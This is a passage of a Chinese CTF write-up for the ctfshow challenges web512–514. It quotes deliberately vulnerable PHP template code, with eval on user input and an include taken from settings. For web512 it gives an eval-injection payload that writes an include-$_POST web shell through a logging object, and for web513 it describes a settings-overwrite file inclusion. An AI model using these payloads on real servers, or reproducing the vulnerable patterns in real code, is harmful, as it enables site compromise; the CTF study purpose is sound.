<p>到这里我们还需要一个可以存在这里的<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>也就是<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>,我们之间上传一个就好了啊<code>&#123;&#123;var:nickname&#125;&#125;</code></p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141747100.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414141747100"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145931393.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414145931393"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414150059799.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414150059799"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145937985.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414145937985"></p>

<p>这里要注意stripos()函数,如果在第一位的话就执行不了了</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145955200.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414145955200"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414190915815.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>

<h1 id="web512"><a href="#web512" class="headerlink" title="web512"></a>web512</h1><p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-25 21:15:03
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
        $cache=templateUtil::shade($templateContent,$arg);
        echo $cache;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        $templateContent=templateUtil::checkImage($templateContent,$arg);
        $templateContent=templateUtil::checkConfig($templateContent);
        $templateContent=templateUtil::checkVar($templateContent,$arg);
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

    public static function checkImage($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);
            &#125;
            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;
                $encode=&#39;&#39;;
                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;
                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
                &#125;else&#123;
                    $ch=curl_init($value);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    $result=curl_exec($ch);
                    curl_close($ch);
                    $ret=chunk_split(base64_encode($result));
                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
                &#125;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;
    public static function checkConfig($templateContent)&#123;
        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
        foreach ($config as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;

    public static function checkVar($templateContent,$arg)&#123;
        $db=new db();
        foreach ($arg as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;
                if(!preg_match(&#39;/\(|\[|\`|\&#39;|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&#123;
                    eval(&#39;$v=&#39;.$value.&#39;;&#39;);
                    $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);
                &#125;
                
            &#125;
        &#125;
        return $templateContent;
    &#125;


&#125;
</code></pre>
<p>这里要进行拼接</p>
<p>db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 05:02:27
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class db&#123;

    public $db;
    public $log;
    public $sql;
    public $username=&#39;root&#39;;
    public $password=&#39;root&#39;;
    public $port=&#39;3306&#39;;
    public $addr=&#39;127.0.0.1&#39;;
    public $database=&#39;ctfshow&#39;;
    public function __construct()&#123;
        $this-&gt;log=new dbLog();
        $this-&gt;db=$this-&gt;getConnection();
    &#125;

    public function getConnection()&#123;

        return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
    &#125;

    public  function select_one($sql)&#123;
        $this-&gt;sql=$sql;
        $result=$this-&gt;db-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
    public  function select_one_array($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $result=$this-&gt;db-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_assoc();
        &#125;
    &#125;
    public function update_one($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $this-&gt;db-&gt;query($sql);
        return $this-&gt;db-&gt;affected_rows;
    &#125;

    public function __destruct()&#123;
        $this-&gt;log-&gt;log($this-&gt;sql);
    &#125;
&#125;
class dbLog&#123;
    public $sql;
    public $content;
    public $log;

    public function __construct()&#123;
        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;
    &#125;
    public function log($sql)&#123;
        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
    &#125;
    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;
</code></pre>
<p>因为过滤掉了()所以采用include</p>
<pre><code class="php">1;#为了结束上一个$v的赋值语句
$a = &lt;&lt;&lt;ctfshow
&lt;?php includ
ctfshow;
$b = &lt;&lt;&lt;ctfshow
e $
ctfshow;
$v1 = &lt;&lt;&lt;ctfshow
_POS
ctfshow;
$c = &lt;&lt;&lt; ctfshow
T&#123;1&#125;?&gt;
ctfshow;
$d = &lt;&lt;&lt;ctfshow
1.php
ctfshow;
$e = clone $db;#克隆一个$db对象,原因是$db有写文件的方法
$db-&gt;log-&gt;log = $d;#前一个log是db类的log后面的是dblog类的log
$db-&gt;log-&gt;content = $a.$b.$v1.$c;

#$a.$b.$v1$c=&lt;?php include $_POST&#123;1&#125;?&gt;
</code></pre>
<pre><code class="php">1;
$a=&lt;&lt;&lt;ctfshow
&lt;?php includ
ctfshow;
$b=&lt;&lt;&lt;ctfshow
e $
ctfshow;
$v1=&lt;&lt;&lt;ctfshow
_POS
ctfshow;
$c=&lt;&lt;&lt;ctfshow
T&#123;1&#125;?&gt;
ctfshow;
$d=&lt;&lt;&lt;ctfshow
2.php
ctfshow;
$e=clone $db;
$db-&gt;log-&gt;log=$d;
$db-&gt;log-&gt;content=$a.$b.$v1.$c;
</code></pre>
<pre><code class="php">&#123;&#123;var:nickname&#125;&#125;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163202241.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414163202241"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155052515.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414155052515"></p>

<p>记得抓包改</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155109466.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414155109466"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163241108.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414163241108"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163406655.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414163406655"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163441821.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414163441821"></p>

<h1 id="web513"><a href="#web513" class="headerlink" title="web513"></a>web513</h1><p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-26 07:25:25
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
        $cache=templateUtil::shade($templateContent,$arg);
        echo $cache;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        $templateContent=templateUtil::checkImage($templateContent,$arg);
        $templateContent=templateUtil::checkConfig($templateContent);
        $templateContent=templateUtil::checkVar($templateContent,$arg);
        $templateContent=templateUtil::checkFoot($templateContent);
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

    public static function checkImage($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);
            &#125;
            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;
                $encode=&#39;&#39;;
                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;
                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
                &#125;else&#123;
                    $ch=curl_init($value);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    $result=curl_exec($ch);
                    curl_close($ch);
                    $ret=chunk_split(base64_encode($result));
                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
                &#125;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;
    public static function checkConfig($templateContent)&#123;
        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
        foreach ($config as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;

    public static function checkVar($templateContent,$arg)&#123;
        $db=new db();
        foreach ($arg as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;
                if(!preg_match(&#39;/\(|\[|\`|\&#39;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&#123;
                    eval(&#39;$v=&#39;.$value.&#39;;&#39;);
                    $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);
                &#125;
                
            &#125;
        &#125;
        return $templateContent;
    &#125;

    public static function checkFoot($templateContent)&#123;
        if ( stripos($templateContent, &#39;&#123;&#123;cnzz&#125;&#125;&#39;)) &#123;
            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
            $foot = $config[&#39;cnzz&#39;];
            if(is_file($foot))&#123;
                $foot=file_get_contents($foot);
                include($foot);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;




&#125;
</code></pre>
<p>&#x2F;api&#x2F;admin_settings.php</p>
<pre><code class="php">
&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 15:50:14
 Last Modified by:   h1xa
 Last Modified time: 2021-03-16 16:26:31
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
    foreach ($_POST as $key =&gt; $value) &#123;
        $config[$key]=$value;
    &#125;
    file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));
    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
</code></pre>
<pre><code class="php">public static function checkFoot($templateContent)&#123;
        if ( stripos($templateContent, &#39;&#123;&#123;cnzz&#125;&#125;&#39;)) &#123;
            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
            $foot = $config[&#39;cnzz&#39;];
            if(is_file($foot))&#123;
                $foot=file_get_contents($foot);
                include($foot);
            &#125;
</code></pre>
<p>我们可以将config中的cnzz改成另一个文件,这样就可以使foot先访问config中的cnzz,接着cnzz又是另一个文件.进行二次文件访问.</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414175947530.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414174933530"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180031940.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414180031940"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180041275.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414180041275"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180054215.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414180054215"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180124402.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414180124402"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181027066.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414181027066"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181233123.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414181233123"></p>

<h1 id="web514"><a href="#web514" class="headerlink" title="web514"></a>web514</h1><p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-28 16:27:27
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
        $cache=templateUtil::shade($templateContent,$arg);
        echo $cache;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        $templateContent=templateUtil::checkImage($templateContent,$arg);
        $templateContent=templateUtil::checkConfig($templateContent);
        $templateContent=templateUtil::checkVar($templateContent,$arg);
        $templateContent=templateUtil::checkFoot($templateContent);
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

    public static function checkImage($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);
            &#125;
            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;
                $encode=&#39;&#39;;
                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;
                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
                &#125;else&#123;
                    $ch=curl_init($value);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    $result=curl_exec($ch);
                    curl_close($ch);
                    $ret=chunk_split(base64_encode($result));
